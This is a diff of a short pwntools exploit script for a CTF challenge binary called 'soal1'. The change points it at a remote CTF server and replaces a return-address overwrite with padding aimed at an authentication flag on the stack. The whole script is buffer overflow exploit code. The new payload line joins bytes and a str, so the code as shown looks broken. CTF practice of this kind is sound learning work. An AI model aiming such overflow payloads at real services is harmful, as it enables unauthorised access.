@@ -1,8 +1,12 @@
 from pwn import *
 
-# r = remote('ctf99x.cs.ui.ac.id', 10001)
-r = process('./soal1')
+r = remote('ctf99x.cs.ui.ac.id', 10001)
+# r = process('./soal1')
 
-check_password = 0x565c26fd
-payload = b'A'*10 + p32(check_password)
+# auth flag: ebp-0x28
+payload = b'A'*12 + 'AABB'
+print('len', len(payload))
 r.sendline(payload)
+print(r.recvline())
+print(r.recvline())
+print(r.recvline())
